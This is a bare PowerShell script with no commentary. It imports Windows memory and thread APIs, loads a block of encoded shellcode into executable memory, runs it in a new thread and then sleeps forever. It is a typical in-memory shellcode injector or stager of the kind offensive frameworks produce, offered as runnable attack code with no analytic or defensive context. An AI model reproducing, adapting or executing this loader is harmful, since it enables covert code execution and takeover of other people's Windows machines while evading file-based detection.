$z1a = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $z1a -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdb,0xcf,0xd9,0x74,0x24,0xf4,0x58,0x2b,0xc9,0xbb,0x49,0xff,0x77,0xbb,0xb1,0x47,0x83,0xe8,0xfc,0x31,0x58,0x14,0x03,0x58,0x5d,0x1d,0x82,0x47,0xb5,0x63,0x6d,0xb8,0x45,0x04,0xe7,0x5d,0x74,0x04,0x93,0x16,0x26,0xb4,0xd7,0x7b,0xca,0x3f,0xb5,0x6f,0x59,0x4d,0x12,0x9f,0xea,0xf8,0x44,0xae,0xeb,0x51,0xb4,0xb1,0x6f,0xa8,0xe9,0x11,0x4e,0x63,0xfc,0x50,0x97,0x9e,0x0d,0x00,0x40,0xd4,0xa0,0xb5,0xe5,0xa0,0x78,0x3d,0xb5,0x25,0xf9,0xa2,0x0d,0x47,0x28,0x75,0x06,0x1e,0xea,0x77,0xcb,0x2a,0xa3,0x6f,0x08,0x16,0x7d,0x1b,0xfa,0xec,0x7c,0xcd,0x33,0x0c,0xd2,0x30,0xfc,0xff,0x2a,0x74,0x3a,0xe0,0x58,0x8c,0x39,0x9d,0x5a,0x4b,0x40,0x79,0xee,0x48,0xe2,0x0a,0x48,0xb5,0x13,0xde,0x0f,0x3e,0x1f,0xab,0x44,0x18,0x03,0x2a,0x88,0x12,0x3f,0xa7,0x2f,0xf5,0xb6,0xf3,0x0b,0xd1,0x93,0xa0,0x32,0x40,0x79,0x06,0x4a,0x92,0x22,0xf7,0xee,0xd8,0xce,0xec,0x82,0x82,0x86,0xc1,0xae,0x3c,0x56,0x4e,0xb8,0x4f,0x64,0xd1,0x12,0xd8,0xc4,0x9a,0xbc,0x1f,0x2b,0xb1,0x79,0x8f,0xd2,0x3a,0x7a,0x99,0x10,0x6e,0x2a,0xb1,0xb1,0x0f,0xa1,0x41,0x3e,0xda,0x5c,0x47,0xa8,0xef,0x1a,0x45,0x67,0x98,0x58,0x4a,0x66,0x04,0xd4,0xac,0xd8,0xe4,0xb6,0x60,0x98,0x54,0x77,0xd1,0x70,0xbf,0x78,0x0e,0x60,0xc0,0x52,0x27,0x0a,0x2f,0x0b,0x1f,0xa2,0xd6,0x16,0xeb,0x53,0x16,0x8d,0x91,0x53,0x9c,0x22,0x65,0x1d,0x55,0x4e,0x75,0xc9,0x95,0x05,0x27,0x5f,0xa9,0xb3,0x42,0x5f,0x3f,0x38,0xc5,0x08,0xd7,0x42,0x30,0x7e,0x78,0xbc,0x17,0xf5,0xb1,0x28,0xd8,0x61,0xbe,0xbc,0xd8,0x71,0xe8,0xd6,0xd8,0x19,0x4c,0x83,0x8a,0x3c,0x93,0x1e,0xbf,0xed,0x06,0xa1,0x96,0x42,0x80,0xc9,0x14,0xbd,0xe6,0x55,0xe6,0xe8,0xf6,0xaa,0x31,0xd4,0x8c,0xc2,0x81;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$lOJ=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($lOJ.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$lOJ,0,0,0);for (;;){Start-sleep 60};